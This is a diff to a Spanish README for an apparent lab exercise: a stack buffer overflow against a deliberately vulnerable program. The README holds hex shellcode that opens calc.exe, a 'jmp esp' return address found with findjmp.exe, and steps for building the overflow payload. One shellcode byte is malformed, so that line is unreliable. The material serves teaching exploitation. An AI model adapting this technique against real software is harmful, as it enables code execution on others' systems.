@@ -15,7 +15,7 @@ Para la creación del proyecto se ha seguido la explicación de <a href="https:/
 <h3>Exploit.c</h3>
 <p>Este es el programa que aprovechará la vulnerabilidad del programa vuln1 para desbordar el buffer y abrir la calculadora</p>
 
-<h2>Funcionamiento</h2>
+<h2>Creación</h2>
 <p>El primer paso será compilar el archivo vulnerable de la siguiente forma:</p>
 
 ```
@@ -64,3 +64,16 @@ El código resultante será el siguiente
 \x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\0xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3
 ```
 Con esto ya tendríamos todo lo necesario para crear nuestro exploit así que vamos al lío.
+
+Crearemos un buffer muy grande (en mi caso 1024 bytes) donde cargaremos todo el payload. Guardaremos el código hexadecimal del shellcode en una string shellcode para añadirlo al payload más tarde.
+Ahora usaremos el findjmp.exe para encontrar el offset necesario para que el exploit funcione:
+```
+findjmp.exe kernel32.dll esp
+```
+Esto nos devolvera una dirección pero tendremos que introducirla en otro string al revés siendo el resultado el siguiente:
+```
+\x7B\x46\x86\x7C
+```
+
+Comprobaremos que se introduzca 1 argumento a la hora de ejecutar el exploit. Copiaremos el argumento que hayamos introducido en el buffer grande, para llenar el buffer vulnerable de la aplicación, luego añadiremos la dirección de memoria que acabamos de conseguir y tras esto el shellcode.
+Tras esto ejecutaremos el programa vulnerable dandole como argumento el buffer malicioso que hemos creado y esto abrirá la calculadora.
